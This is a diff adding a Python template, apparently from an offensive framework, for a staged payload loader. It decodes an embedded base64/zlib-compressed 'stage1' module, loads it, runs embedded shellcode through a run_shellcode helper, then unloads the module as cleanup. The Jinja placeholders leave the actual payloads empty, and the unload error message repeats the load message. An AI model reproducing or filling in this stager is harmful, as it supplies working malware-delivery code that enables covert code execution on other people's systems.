@@ -1,0 +1,32 @@
+import os
+import base64
+import zlib
+
+{{ module_loader_class }}
+
+{{ module_bytecode_runner }}
+
+def main():
+    stage1 = zlib.decompress(base64.b64decode('{{ encoded_stage1 }}'))
+    stage1_name = '{{ stage1_name }}'
+
+    # Load stage1
+    ml = ModuleLoader()
+    res = ml.load(stage1)
+    if res[0] != 0:
+        print(f'did not load module: {os.strerror(res[1])}')
+        return -1
+
+    # Use stage1 to load the payload
+    bcode = zlib.decompress(base64.b64decode('{{ encoded_bytecode }}'))
+    run_shellcode(bcode)
+
+    # Cleanup stage1
+    res = ml.unload(stage1_name)
+    if res[0] != 0:
+        print(f'did not load module: {os.strerror(res[1])}')
+        return -1
+
+
+if __name__ == "__main__":
+    main()
